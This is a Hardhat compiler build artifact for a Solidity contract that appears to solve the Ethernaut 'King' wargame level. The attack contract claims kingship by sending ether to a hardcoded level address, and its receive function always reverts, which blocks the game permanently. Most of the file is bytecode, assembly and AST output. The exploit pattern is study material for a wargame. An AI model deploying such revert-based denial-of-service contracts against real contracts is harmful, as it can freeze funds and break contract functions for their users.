{
	"id": "c4f756505078178478aba9c1b1a7b129",
	"_format": "hh-sol-build-info-1",
	"solcVersion": "0.8.7",
	"solcLongVersion": "0.8.7+commit.e28d00a7",
	"input": {
		"language": "Solidity",
		"sources": {
			"ethernautKing.sol": {
				"content": "// SPDX-License-Identifier: MIT\r\npragma solidity ^0.8.7;\r\n\r\n/*contract King {\r\n\r\n  address payable king;\r\n  uint public prize;\r\n  address payable public owner;\r\n\r\n  constructor() public payable {\r\n    owner = msg.sender;  \r\n    king = msg.sender;\r\n    prize = msg.value;\r\n  }\r\n\r\n  receive() external payable {\r\n    require(msg.value >= prize || msg.sender == owner);\r\n    king.transfer(msg.value);\r\n    king = msg.sender;\r\n    prize = msg.value;\r\n  }\r\n\r\n  function _king() public view returns (address payable) {\r\n    return king;\r\n  }\r\n}*/\r\n\r\n//0x557d634258B353BAC0F7d17d807DAAE74851F638\r\n\r\ncontract ethernautKing {\r\n    constructor () payable {}\r\n\r\n    function solve() external {\r\n        address contractAddr = 0x557d634258B353BAC0F7d17d807DAAE74851F638;\r\n        contractAddr.call{value: 1000000000000001}(\"\");\r\n    }\r\n\r\n    receive() external payable {\r\n        revert();\r\n    }\r\n}\r\n"
			}
		},
		"settings": {
			"optimizer": {
				"enabled": false,
				"runs": 200
			},
			"outputSelection": {
				"*": {
					"": [
						"ast"
					],
					"*": [
						"abi",
						"metadata",
						"devdoc",
						"userdoc",
						"storageLayout",
						"evm.legacyAssembly",
						"evm.bytecode",
						"evm.deployedBytecode",
						"evm.methodIdentifiers",
						"evm.gasEstimates",
						"evm.assembly"
					]
				}
			}
		}
	},
	"output": {
		"contracts": {
			"ethernautKing.sol": {
				"ethernautKing": {
					"abi": [
						{
							"inputs": [],
							"stateMutability": "payable",
							"type": "constructor"
						},
						{
							"inputs": [],
							"name": "solve",
							"outputs": [],
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"stateMutability": "payable",
							"type": "receive"
						}
					],
					"devdoc": {
						"kind": "dev",
						"methods": {},
						"version": 1
					},
					"evm": {
						"assembly": "    /* \"ethernautKing.sol\":592:887  contract ethernautKing {\r... */\n  mstore(0x40, 0x80)\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"ethernautKing.sol\":592:887  contract ethernautKing {\r... */\n      mstore(0x40, 0x80)\n      jumpi(tag_1, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0x890d6908\n      eq\n      tag_3\n      jumpi\n      jump(tag_2)\n    tag_1:\n      jumpi(tag_2, calldatasize)\n        /* \"ethernautKing.sol\":868:876  revert() */\n      0x00\n      dup1\n      revert\n        /* \"ethernautKing.sol\":592:887  contract ethernautKing {\r... */\n    tag_2:\n      0x00\n      dup1\n      revert\n        /* \"ethernautKing.sol\":655:822  function solve() external {\r... */\n    tag_3:\n      callvalue\n      dup1\n      iszero\n      tag_6\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_6:\n      pop\n      tag_7\n      tag_8\n      jump\t// in\n    tag_7:\n      stop\n    tag_8:\n        /* \"ethernautKing.sol\":692:712  address contractAddr */\n      0x00\n        /* \"ethernautKing.sol\":715:757  0x557d634258B353BAC0F7d17d807DAAE74851F638 */\n      0x557d634258b353bac0f7d17d807daae74851f638\n        /* \"ethernautKing.sol\":692:757  address contractAddr = 0x557d634258B353BAC0F7d17d807DAAE74851F638 */\n      swap1\n      pop\n        /* \"ethernautKing.sol\":768:780  contractAddr */\n      dup1\n        /* \"ethernautKing.sol\":768:785  contractAddr.call */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"ethernautKing.sol\":793:809  1000000000000001 */\n      0x038d7ea4c68001\n        /* \"ethernautKing.sol\":768:814  contractAddr.call{value: 1000000000000001}(\"\") */\n      mload(0x40)\n      tag_10\n      swap1\n      tag_11\n      jump\t// in\n    tag_10:\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup6\n      dup8\n      gas\n      call\n      swap3\n      pop\n      pop\n      pop\n      returndatasize\n      dup1\n      0x00\n      dup2\n      eq\n      tag_14\n      jumpi\n      mload(0x40)\n      swap2\n      pop\n      and(add(returndatasize, 0x3f), not(0x1f))\n      dup3\n      add\n      0x40\n      mstore\n      returndatasize\n      dup3\n      mstore\n      returndatasize\n      0x00\n      0x20\n      dup5\n      add\n      returndatacopy\n      jump(tag_13)\n    tag_14:\n      0x60\n      swap2\n      pop\n    tag_13:\n      pop\n      pop\n      pop\n        /* \"ethernautKing.sol\":681:822  {\r... */\n      pop\n        /* \"ethernautKing.sol\":655:822  function solve() external {\r... */\n      jump\t// out\n        /* \"#utility.yul\":7:405   */\n    tag_16:\n        /* \"#utility.yul\":166:169   */\n      0x00\n        /* \"#utility.yul\":187:270   */\n      tag_18\n        /* \"#utility.yul\":268:269   */\n      0x00\n        /* \"#utility.yul\":263:266   */\n      dup4\n        /* \"#utility.yul\":187:270   */\n      tag_19\n      jump\t// in\n    tag_18:\n        /* \"#utility.yul\":180:270   */\n      swap2\n      pop\n        /* \"#utility.yul\":279:372   */\n      tag_20\n        /* \"#utility.yul\":368:371   */\n      dup3\n        /* \"#utility.yul\":279:372   */\n      tag_21\n      jump\t// in\n    tag_20:\n        /* \"#utility.yul\":397:398   */\n      0x00\n        /* \"#utility.yul\":392:395   */\n      dup3\n        /* \"#utility.yul\":388:399   */\n      add\n        /* \"#utility.yul\":381:399   */\n      swap1\n      pop\n        /* \"#utility.yul\":7:405   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":411:790   */\n    tag_11:\n        /* \"#utility.yul\":595:598   */\n      0x00\n        /* \"#utility.yul\":617:764   */\n      tag_23\n        /* \"#utility.yul\":760:763   */\n      dup3\n        /* \"#utility.yul\":617:764   */\n      tag_16\n      jump\t// in\n    tag_23:\n        /* \"#utility.yul\":610:764   */\n      swap2\n      pop\n        /* \"#utility.yul\":781:784   */\n      dup2\n        /* \"#utility.yul\":774:784   */\n      swap1\n      pop\n        /* \"#utility.yul\":411:790   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":796:943   */\n    tag_19:\n        /* \"#utility.yul\":897:908   */\n      0x00\n        /* \"#utility.yul\":934:937   */\n      dup2\n        /* \"#utility.yul\":919:937   */\n      swap1\n      pop\n        /* \"#utility.yul\":796:943   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":949:1063   */\n    tag_21:\n      pop\n      jump\t// out\n\n    auxdata: 0xa2646970667358221220188bd9f7a6f421decedc14871b29b5f93a054cf46ed78a3f7e784cabb24226b464736f6c63430008070033\n}\n",
						"bytecode": {
							"functionDebugData": {
								"@_5": {
									"entryPoint": null,
									"id": 5,
									"parameterSlots": 0,
									"returnSlots": 0
								}
							},
							"generatedSources": [],
							"linkReferences": {},
							"object": "6080604052610150806100136000396000f3fe6080604052600436106100225760003560e01c8063890d6908146100315761002c565b3661002c57600080fd5b600080fd5b34801561003d57600080fd5b50610046610048565b005b600073557d634258b353bac0f7d17d807daae74851f63890508073ffffffffffffffffffffffffffffffffffffffff1666038d7ea4c6800160405161008c906100f7565b60006040518083038185875af1925050503d80600081146100c9576040519150601f19603f3d011682016040523d82523d6000602084013e6100ce565b606091505b50505050565b60006100e160008361010c565b91506100ec82610117565b600082019050919050565b6000610102826100d4565b9150819050919050565b600081905092915050565b5056fea2646970667358221220188bd9f7a6f421decedc14871b29b5f93a054cf46ed78a3f7e784cabb24226b464736f6c63430008070033",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE PUSH2 0x150 DUP1 PUSH2 0x13 PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH2 0x22 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x890D6908 EQ PUSH2 0x31 JUMPI PUSH2 0x2C JUMP JUMPDEST CALLDATASIZE PUSH2 0x2C JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x3D JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x46 PUSH2 0x48 JUMP JUMPDEST STOP JUMPDEST PUSH1 0x0 PUSH20 0x557D634258B353BAC0F7D17D807DAAE74851F638 SWAP1 POP DUP1 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH7 0x38D7EA4C68001 PUSH1 0x40 MLOAD PUSH2 0x8C SWAP1 PUSH2 0xF7 JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP8 GAS CALL SWAP3 POP POP POP RETURNDATASIZE DUP1 PUSH1 0x0 DUP2 EQ PUSH2 0xC9 JUMPI PUSH1 0x40 MLOAD SWAP2 POP PUSH1 0x1F NOT PUSH1 0x3F RETURNDATASIZE ADD AND DUP3 ADD PUSH1 0x40 MSTORE RETURNDATASIZE DUP3 MSTORE RETURNDATASIZE PUSH1 0x0 PUSH1 0x20 DUP5 ADD RETURNDATACOPY PUSH2 0xCE JUMP JUMPDEST PUSH1 0x60 SWAP2 POP JUMPDEST POP POP POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0xE1 PUSH1 0x0 DUP4 PUSH2 0x10C JUMP JUMPDEST SWAP2 POP PUSH2 0xEC DUP3 PUSH2 0x117 JUMP JUMPDEST PUSH1 0x0 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x102 DUP3 PUSH2 0xD4 JUMP JUMPDEST SWAP2 POP DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 XOR DUP12 0xD9 0xF7 0xA6 DELEGATECALL 0x21 0xDE 0xCE 0xDC EQ DUP8 SHL 0x29 0xB5 0xF9 GASPRICE SDIV 0x4C DELEGATECALL PUSH15 0xD78A3F7E784CABB24226B464736F6C PUSH4 0x43000807 STOP CALLER ",
							"sourceMap": "592:295:0:-:0;;;;;;;;;"
						},
						"deployedBytecode": {
							"functionDebugData": {
								"@_28": {
									"entryPoint": null,
									"id": 28,
									"parameterSlots": 0,
									"returnSlots": 0
								},
								"@solve_21": {
									"entryPoint": 72,
									"id": 21,
									"parameterSlots": 0,
									"returnSlots": 0
								},
								"abi_encode_t_stringliteral_c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470_to_t_bytes_memory_ptr_nonPadded_inplace_fromStack": {
									"entryPoint": 212,
									"id": null,
									"parameterSlots": 1,
									"returnSlots": 1
								},
								"abi_encode_tuple_packed_t_stringliteral_c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470__to_t_bytes_memory_ptr__nonPadded_inplace_fromStack_reversed": {
									"entryPoint": 247,
									"id": null,
									"parameterSlots": 1,
									"returnSlots": 1
								},
								"array_storeLengthForEncoding_t_bytes_memory_ptr_nonPadded_inplace_fromStack": {
									"entryPoint": 268,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 1
								},
								"store_literal_in_memory_c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470": {
									"entryPoint": 279,
									"id": null,
									"parameterSlots": 1,
									"returnSlots": 0
								}
							},
							"generatedSources": [
								{
									"ast": {
										"nodeType": "YulBlock",
										"src": "0:1066:1",
										"statements": [
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "170:235:1",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "180:90:1",
															"value": {
																"arguments": [
																	{
																		"name": "pos",
																		"nodeType": "YulIdentifier",
																		"src": "263:3:1"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "268:1:1",
																		"type": "",
																		"value": "0"
																	}
																],
																"functionName": {
																	"name": "array_storeLengthForEncoding_t_bytes_memory_ptr_nonPadded_inplace_fromStack",
																	"nodeType": "YulIdentifier",
																	"src": "187:75:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "187:83:1"
															},
															"variableNames": [
																{
																	"name": "pos",
																	"nodeType": "YulIdentifier",
																	"src": "180:3:1"
																}
															]
														},
														{
															"expression": {
																"arguments": [
																	{
																		"name": "pos",
																		"nodeType": "YulIdentifier",
																		"src": "368:3:1"
																	}
																],
																"functionName": {
																	"name": "store_literal_in_memory_c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470",
																	"nodeType": "YulIdentifier",
																	"src": "279:88:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "279:93:1"
															},
															"nodeType": "YulExpressionStatement",
															"src": "279:93:1"
														},
														{
															"nodeType": "YulAssignment",
															"src": "381:18:1",
															"value": {
																"arguments": [
																	{
																		"name": "pos",
																		"nodeType": "YulIdentifier",
																		"src": "392:3:1"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "397:1:1",
																		"type": "",
																		"value": "0"
																	}
																],
																"functionName": {
																	"name": "add",
																	"nodeType": "YulIdentifier",
																	"src": "388:3:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "388:11:1"
															},
															"variableNames": [
																{
																	"name": "end",
																	"nodeType": "YulIdentifier",
																	"src": "381:3:1"
																}
															]
														}
													]
												},
												"name": "abi_encode_t_stringliteral_c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470_to_t_bytes_memory_ptr_nonPadded_inplace_fromStack",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "pos",
														"nodeType": "YulTypedName",
														"src": "158:3:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "end",
														"nodeType": "YulTypedName",
														"src": "166:3:1",
														"type": ""
													}
												],
												"src": "7:398:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "599:191:1",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "610:154:1",
															"value": {
																"arguments": [
																	{
																		"name": "pos",
																		"nodeType": "YulIdentifier",
																		"src": "760:3:1"
																	}
																],
																"functionName": {
																	"name": "abi_encode_t_stringliteral_c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470_to_t_bytes_memory_ptr_nonPadded_inplace_fromStack",
																	"nodeType": "YulIdentifier",
																	"src": "617:141:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "617:147:1"
															},
															"variableNames": [
																{
																	"name": "pos",
																	"nodeType": "YulIdentifier",
																	"src": "610:3:1"
																}
															]
														},
														{
															"nodeType": "YulAssignment",
															"src": "774:10:1",
															"value": {
																"name": "pos",
																"nodeType": "YulIdentifier",
																"src": "781:3:1"
															},
															"variableNames": [
																{
																	"name": "end",
																	"nodeType": "YulIdentifier",
																	"src": "774:3:1"
																}
															]
														}
													]
												},
												"name": "abi_encode_tuple_packed_t_stringliteral_c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470__to_t_bytes_memory_ptr__nonPadded_inplace_fromStack_reversed",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "pos",
														"nodeType": "YulTypedName",
														"src": "586:3:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "end",
														"nodeType": "YulTypedName",
														"src": "595:3:1",
														"type": ""
													}
												],
												"src": "411:379:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "909:34:1",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "919:18:1",
															"value": {
																"name": "pos",
																"nodeType": "YulIdentifier",
																"src": "934:3:1"
															},
															"variableNames": [
																{
																	"name": "updated_pos",
																	"nodeType": "YulIdentifier",
																	"src": "919:11:1"
																}
															]
														}
													]
												},
												"name": "array_storeLengthForEncoding_t_bytes_memory_ptr_nonPadded_inplace_fromStack",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "pos",
														"nodeType": "YulTypedName",
														"src": "881:3:1",
														"type": ""
													},
													{
														"name": "length",
														"nodeType": "YulTypedName",
														"src": "886:6:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "updated_pos",
														"nodeType": "YulTypedName",
														"src": "897:11:1",
														"type": ""
													}
												],
												"src": "796:147:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "1055:8:1",
													"statements": []
												},
												"name": "store_literal_in_memory_c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "memPtr",
														"nodeType": "YulTypedName",
														"src": "1047:6:1",
														"type": ""
													}
												],
												"src": "949:114:1"
											}
										]
									},
									"contents": "{\n\n    function abi_encode_t_stringliteral_c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470_to_t_bytes_memory_ptr_nonPadded_inplace_fromStack(pos) -> end {\n        pos := array_storeLengthForEncoding_t_bytes_memory_ptr_nonPadded_inplace_fromStack(pos, 0)\n        store_literal_in_memory_c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470(pos)\n        end := add(pos, 0)\n    }\n\n    function abi_encode_tuple_packed_t_stringliteral_c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470__to_t_bytes_memory_ptr__nonPadded_inplace_fromStack_reversed(pos ) -> end {\n\n        pos := abi_encode_t_stringliteral_c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470_to_t_bytes_memory_ptr_nonPadded_inplace_fromStack( pos)\n\n        end := pos\n    }\n\n    function array_storeLengthForEncoding_t_bytes_memory_ptr_nonPadded_inplace_fromStack(pos, length) -> updated_pos {\n        updated_pos := pos\n    }\n\n    function store_literal_in_memory_c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470(memPtr) {\n\n    }\n\n}\n",
									"id": 1,
									"language": "Yul",
									"name": "#utility.yul"
								}
							],
							"immutableReferences": {},
							"linkReferences": {},
							"object": "6080604052600436106100225760003560e01c8063890d6908146100315761002c565b3661002c57600080fd5b600080fd5b34801561003d57600080fd5b50610046610048565b005b600073557d634258b353bac0f7d17d807daae74851f63890508073ffffffffffffffffffffffffffffffffffffffff1666038d7ea4c6800160405161008c906100f7565b60006040518083038185875af1925050503d80600081146100c9576040519150601f19603f3d011682016040523d82523d6000602084013e6100ce565b606091505b50505050565b60006100e160008361010c565b91506100ec82610117565b600082019050919050565b6000610102826100d4565b9150819050919050565b600081905092915050565b5056fea2646970667358221220188bd9f7a6f421decedc14871b29b5f93a054cf46ed78a3f7e784cabb24226b464736f6c63430008070033",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH2 0x22 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x890D6908 EQ PUSH2 0x31 JUMPI PUSH2 0x2C JUMP JUMPDEST CALLDATASIZE PUSH2 0x2C JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x3D JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x46 PUSH2 0x48 JUMP JUMPDEST STOP JUMPDEST PUSH1 0x0 PUSH20 0x557D634258B353BAC0F7D17D807DAAE74851F638 SWAP1 POP DUP1 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH7 0x38D7EA4C68001 PUSH1 0x40 MLOAD PUSH2 0x8C SWAP1 PUSH2 0xF7 JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP8 GAS CALL SWAP3 POP POP POP RETURNDATASIZE DUP1 PUSH1 0x0 DUP2 EQ PUSH2 0xC9 JUMPI PUSH1 0x40 MLOAD SWAP2 POP PUSH1 0x1F NOT PUSH1 0x3F RETURNDATASIZE ADD AND DUP3 ADD PUSH1 0x40 MSTORE RETURNDATASIZE DUP3 MSTORE RETURNDATASIZE PUSH1 0x0 PUSH1 0x20 DUP5 ADD RETURNDATACOPY PUSH2 0xCE JUMP JUMPDEST PUSH1 0x60 SWAP2 POP JUMPDEST POP POP POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0xE1 PUSH1 0x0 DUP4 PUSH2 0x10C JUMP JUMPDEST SWAP2 POP PUSH2 0xEC DUP3 PUSH2 0x117 JUMP JUMPDEST PUSH1 0x0 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x102 DUP3 PUSH2 0xD4 JUMP JUMPDEST SWAP2 POP DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 XOR DUP12 0xD9 0xF7 0xA6 DELEGATECALL 0x21 0xDE 0xCE 0xDC EQ DUP8 SHL 0x29 0xB5 0xF9 GASPRICE SDIV 0x4C DELEGATECALL PUSH15 0xD78A3F7E784CABB24226B464736F6C PUSH4 0x43000807 STOP CALLER ",
							"sourceMap": "592:295:0:-:0;;;;;;;;;;;;;;;;;;;;;;;868:8;;;592:295;;;;655:167;;;;;;;;;;;;;:::i;:::-;;;692:20;715:42;692:65;;768:12;:17;;793:16;768:46;;;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;681:141;655:167::o;7:398:1:-;166:3;187:83;268:1;263:3;187:83;:::i;:::-;180:90;;279:93;368:3;279:93;:::i;:::-;397:1;392:3;388:11;381:18;;7:398;;;:::o;411:379::-;595:3;617:147;760:3;617:147;:::i;:::-;610:154;;781:3;774:10;;411:379;;;:::o;796:147::-;897:11;934:3;919:18;;796:147;;;;:::o;949:114::-;;:::o"
						},
						"gasEstimates": {
							"creation": {
								"codeDepositCost": "67200",
								"executionCost": "93",
								"totalCost": "67293"
							},
							"external": {
								"solve()": "infinite"
							}
						},
						"legacyAssembly": {
							".code": [
								{
									"begin": 592,
									"end": 887,
									"name": "PUSH",
									"source": 0,
									"value": "80"
								},
								{
									"begin": 592,
									"end": 887,
									"name": "PUSH",
									"source": 0,
									"value": "40"
								},
								{
									"begin": 592,
									"end": 887,
									"name": "MSTORE",
									"source": 0
								},
								{
									"begin": 592,
									"end": 887,
									"name": "PUSH #[$]",
									"source": 0,
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 592,
									"end": 887,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 592,
									"end": 887,
									"name": "PUSH [$]",
									"source": 0,
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 592,
									"end": 887,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 592,
									"end": 887,
									"name": "CODECOPY",
									"source": 0
								},
								{
									"begin": 592,
									"end": 887,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 592,
									"end": 887,
									"name": "RETURN",
									"source": 0
								}
							],
							".data": {
								"0": {
									".auxdata": "a2646970667358221220188bd9f7a6f421decedc14871b29b5f93a054cf46ed78a3f7e784cabb24226b464736f6c63430008070033",
									".code": [
										{
											"begin": 592,
											"end": 887,
											"name": "PUSH",
											"source": 0,
											"value": "80"
										},
										{
											"begin": 592,
											"end": 887,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 592,
											"end": 887,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 592,
											"end": 887,
											"name": "PUSH",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 592,
											"end": 887,
											"name": "CALLDATASIZE",
											"source": 0
										},
										{
											"begin": 592,
											"end": 887,
											"name": "LT",
											"source": 0
										},
										{
											"begin": 592,
											"end": 887,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 592,
											"end": 887,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 592,
											"end": 887,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 592,
											"end": 887,
											"name": "CALLDATALOAD",
											"source": 0
										},
										{
											"begin": 592,
											"end": 887,
											"name": "PUSH",
											"source": 0,
											"value": "E0"
										},
										{
											"begin": 592,
											"end": 887,
											"name": "SHR",
											"source": 0
										},
										{
											"begin": 592,
											"end": 887,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 592,
											"end": 887,
											"name": "PUSH",
											"source": 0,
											"value": "890D6908"
										},
										{
											"begin": 592,
											"end": 887,
											"name": "EQ",
											"source": 0
										},
										{
											"begin": 592,
											"end": 887,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "3"
										},
										{
											"begin": 592,
											"end": 887,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 592,
											"end": 887,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "2"
										},
										{
											"begin": 592,
											"end": 887,
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 592,
											"end": 887,
											"name": "tag",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 592,
											"end": 887,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 592,
											"end": 887,
											"name": "CALLDATASIZE",
											"source": 0
										},
										{
											"begin": 592,
											"end": 887,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "2"
										},
										{
											"begin": 592,
											"end": 887,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 868,
											"end": 876,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 868,
											"end": 876,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 868,
											"end": 876,
											"name": "REVERT",
											"source": 0
										},
										{
											"begin": 592,
											"end": 887,
											"name": "tag",
											"source": 0,
											"value": "2"
										},
										{
											"begin": 592,
											"end": 887,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 592,
											"end": 887,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 592,
											"end": 887,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 592,
											"end": 887,
											"name": "REVERT",
											"source": 0
										},
										{
											"begin": 655,
											"end": 822,
											"name": "tag",
											"source": 0,
											"value": "3"
										},
										{
											"begin": 655,
											"end": 822,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 655,
											"end": 822,
											"name": "CALLVALUE",
											"source": 0
										},
										{
											"begin": 655,
											"end": 822,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 655,
											"end": 822,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 655,
											"end": 822,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "6"
										},
										{
											"begin": 655,
											"end": 822,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 655,
											"end": 822,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 655,
											"end": 822,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 655,
											"end": 822,
											"name": "REVERT",
											"source": 0
										},
										{
											"begin": 655,
											"end": 822,
											"name": "tag",
											"source": 0,
											"value": "6"
										},
										{
											"begin": 655,
											"end": 822,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 655,
											"end": 822,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 655,
											"end": 822,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "7"
										},
										{
											"begin": 655,
											"end": 822,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "8"
										},
										{
											"begin": 655,
											"end": 822,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 655,
											"end": 822,
											"name": "tag",
											"source": 0,
											"value": "7"
										},
										{
											"begin": 655,
											"end": 822,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 655,
											"end": 822,
											"name": "STOP",
											"source": 0
										},
										{
											"begin": 655,
											"end": 822,
											"name": "tag",
											"source": 0,
											"value": "8"
										},
										{
											"begin": 655,
											"end": 822,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 692,
											"end": 712,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 715,
											"end": 757,
											"name": "PUSH",
											"source": 0,
											"value": "557D634258B353BAC0F7D17D807DAAE74851F638"
										},
										{
											"begin": 692,
											"end": 757,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 692,
											"end": 757,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 768,
											"end": 780,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 768,
											"end": 785,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 768,
											"end": 785,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 793,
											"end": 809,
											"name": "PUSH",
											"source": 0,
											"value": "38D7EA4C68001"
										},
										{
											"begin": 768,
											"end": 814,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 768,
											"end": 814,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 768,
											"end": 814,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "10"
										},
										{
